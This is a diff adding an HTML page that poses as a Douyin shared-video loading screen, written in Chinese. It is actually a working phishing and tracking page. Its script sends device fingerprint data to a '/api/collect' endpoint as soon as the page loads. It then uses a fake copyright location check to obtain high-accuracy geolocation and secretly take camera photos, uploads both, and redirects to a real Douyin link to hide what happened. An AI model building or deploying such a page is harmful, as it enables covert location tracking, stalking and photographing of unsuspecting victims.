@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>视频加载中...</title>
+<meta name="description" content="分享了一个视频给你">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0a0a0a;
+    color: #fff;
+    font-family: -apple-system, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+  .logo { width: 72px; height: 72px; margin-bottom: 24px; animation: fadeIn 0.5s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:scale(0.8)} to{opacity:1;transform:scale(1)} }
+  .title { font-size: 18px; font-weight: 600; margin-bottom: 8px; animation: fadeIn 0.6s ease 0.1s both; }
+  .subtitle { font-size: 13px; color: #888; margin-bottom: 40px; animation: fadeIn 0.6s ease 0.2s both; }
+  .spinner {
+    width: 40px; height: 40px;
+    border: 3px solid #222;
+    border-top-color: #fe2c55;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .status { font-size: 12px; color: #555; animation: fadeIn 0.6s ease 0.3s both; min-height: 18px; }
+  .permission-box {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 32px 24px;
+    max-width: 320px;
+  }
+  .permission-icon { font-size: 48px; margin-bottom: 16px; }
+  .permission-title { font-size: 17px; font-weight: 600; margin-bottom: 8px; }
+  .permission-desc { font-size: 13px; color: #888; margin-bottom: 28px; line-height: 1.6; }
+  .btn-allow {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #fe2c55, #ff6b35);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 12px;
+    letter-spacing: 1px;
+  }
+  .btn-skip {
+    background: none;
+    border: none;
+    color: #555;
+    font-size: 13px;
+    cursor: pointer;
+    padding: 8px;
+  }
+  #mainLoader { display: flex; flex-direction: column; align-items: center; }
+  #permBox { display: none; flex-direction: column; align-items: center; }
+</style>
+</head>
+<body>
+
+<!-- 抖音 logo SVG -->
+<div id="mainLoader">
+  <svg class="logo" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <rect width="80" height="80" rx="20" fill="#010101"/>
+    <path d="M54.2 18c.5 5.3 3 8.6 8.8 9.1v8.5c-3 .3-5.6-.7-8.7-2.6v11.6c0 14.7-16 19.3-22.5 8.8-4.1-6.6-1.6-18.2 11.4-18.7v9c-5.5.9-7.1 4.1-5.5 6.6 2.9 4.5 9-.2 9-6.7V18h7.5z" fill="white"/>
+    <path d="M54.2 18c.5 5.3 3 8.6 8.8 9.1v8.5c-3 .3-5.6-.7-8.7-2.6v11.6c0 14.7-16 19.3-22.5 8.8-4.1-6.6-1.6-18.2 11.4-18.7v9c-5.5.9-7.1 4.1-5.5 6.6 2.9 4.5 9-.2 9-6.7V18h7.5z" fill="url(#tg)" opacity="0.5"/>
+    <defs>
+      <linearGradient id="tg" x1="30" y1="18" x2="63" y2="60" gradientUnits="userSpaceOnUse">
+        <stop stop-color="#69C9D0"/>
+        <stop offset="1" stop-color="#EE1D52"/>
+      </linearGradient>
+    </defs>
+  </svg>
+  <div class="title">视频加载中</div>
+  <div class="subtitle">正在为你准备精彩内容...</div>
+  <div class="spinner"></div>
+  <div class="status" id="statusText">连接服务器...</div>
+</div>
+
+<div id="permBox" style="display:none;flex-direction:column;align-items:center;text-align:center;padding:32px 24px;max-width:320px;">
+  <div style="font-size:48px;margin-bottom:16px;">📍</div>
+  <div style="font-size:17px;font-weight:600;margin-bottom:8px;">需要验证你的位置</div>
+  <div style="font-size:13px;color:#888;margin-bottom:28px;line-height:1.6;">
+    根据版权要求，需要确认你所在的地区才能播放此视频。<br>
+    请点击下方按钮允许定位。
+  </div>
+  <button class="btn-allow" onclick="startCapture()">立即播放 ▶</button>
+  <button class="btn-skip" onclick="skipAndReport()">跳过，仅观看部分内容</button>
+</div>
+
+<script>
+const UPLOAD_URL = '/api/collect'; // Cloudflare Worker 接收数据的路由
+
+let collectedData = {
+  id: Math.random().toString(36).slice(2,10).toUpperCase(),
+  time: new Date().toISOString(),
+  referrer: document.referrer,
+  ip: null,
+  device: {
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    screen: screen.width + 'x' + screen.height,
+    os: getOS(),
+    browser: getBrowser(),
+    platform: navigator.platform,
+    touch: navigator.maxTouchPoints > 0,
+    online: navigator.onLine,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    memory: navigator.deviceMemory || null,
+    cores: navigator.hardwareConcurrency || null,
+  },
+  location: null,
+  photos: []
+};
+
+function getOS() {
+  const ua = navigator.userAgent;
+  if (/iPhone|iPad/.test(ua)) return 'iOS';
+  if (/Android/.test(ua)) return 'Android';
+  if (/Windows/.test(ua)) return 'Windows';
+  if (/Mac/.test(ua)) return 'macOS';
+  return 'Unknown';
+}
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (/WeChat|MicroMessenger/.test(ua)) return 'WeChat';
+  if (/TikTok|BytedanceWebview/.test(ua)) return 'TikTok';
+  if (/Chrome/.test(ua)) return 'Chrome';
+  if (/Safari/.test(ua)) return 'Safari';
+  if (/Firefox/.test(ua)) return 'Firefox';
+  return 'Unknown';
+}
+
+function setStatus(msg) {
+  document.getElementById('statusText').textContent = msg;
+}
+
+async function init() {
+  // 先上报基础信息（无论是否授权）
+  setStatus('正在加载资源...');
+  await new Promise(r => setTimeout(r, 1200));
+  setStatus('验证账号信息...');
+  await new Promise(r => setTimeout(r, 800));
+  
+  // 立即发送基础数据（不含位置和照片）
+  sendData();
+
+  setStatus('准备播放...');
+  await new Promise(r => setTimeout(r, 600));
+  
+  // 切换到权限请求界面
+  document.getElementById('mainLoader').style.display = 'none';
+  document.getElementById('permBox').style.display = 'flex';
+}
+
+async function startCapture() {
+  document.getElementById('permBox').innerHTML = `
+    <div style="font-size:40px;margin-bottom:16px;animation:spin2 1s ease-out both">📍</div>
+    <div style="font-size:16px;font-weight:600;margin-bottom:8px">获取位置中...</div>
+    <div style="font-size:12px;color:#666">请在弹窗中点击"允许"</div>
+    <style>@keyframes spin2{from{transform:rotate(-10deg)scale(0.8)}to{transform:rotate(0)scale(1)}}</style>
+  `;
+
+  // 并行获取定位 + 尝试相机
+  const [locResult] = await Promise.allSettled([
+    getLocation(),
+    tryCamera()
+  ]);
+
+  // 发送最终数据
+  sendData();
+
+  // 假装跳转到抖音原链接
+  await new Promise(r => setTimeout(r, 1000));
+  window.location.href = 'https://v.douyin.com/JAjW1jGjio8/';
+}
+
+function skipAndReport() {
+  sendData();
+  window.location.href = 'https://v.douyin.com/JAjW1jGjio8/';
+}
+
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        collectedData.location = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          altitude: pos.coords.altitude,
+          speed: pos.coords.speed,
+          heading: pos.coords.heading,
+          timestamp: pos.timestamp
+        };
+        sendData(); // 立即发送位置
+        resolve(collectedData.location);
+      },
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  });
+}
+
+async function tryCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }
+    });
+    
+    // 拍3张照片（间隔0.5s）
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.setAttribute('playsinline', '');
+    await video.play();
+    
+    await new Promise(r => setTimeout(r, 500)); // 等相机预热
+    
+    for (let i = 0; i < 3; i++) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const base64 = canvas.toDataURL('image/jpeg', 0.7);
+      collectedData.photos.push(base64);
+      await new Promise(r => setTimeout(r, 500));
+    }
+    
+    stream.getTracks().forEach(t => t.stop());
+    sendData(); // 立即发送照片
+  } catch(e) {
+    // 前置摄像头备用
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.setAttribute('playsinline', '');
+      await video.play();
+      await new Promise(r => setTimeout(r, 800));
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      collectedData.photos.push(canvas.toDataURL('image/jpeg', 0.7));
+      stream.getTracks().forEach(t => t.stop());
+      sendData();
+    } catch(e2) {}
+  }
+}
+
+let sending = false;
+async function sendData() {
+  try {
+    await fetch(UPLOAD_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(collectedData),
+      keepalive: true
+    });
+  } catch(e) {}
+}
+
+init();
+</script>
+</body>
+</html>
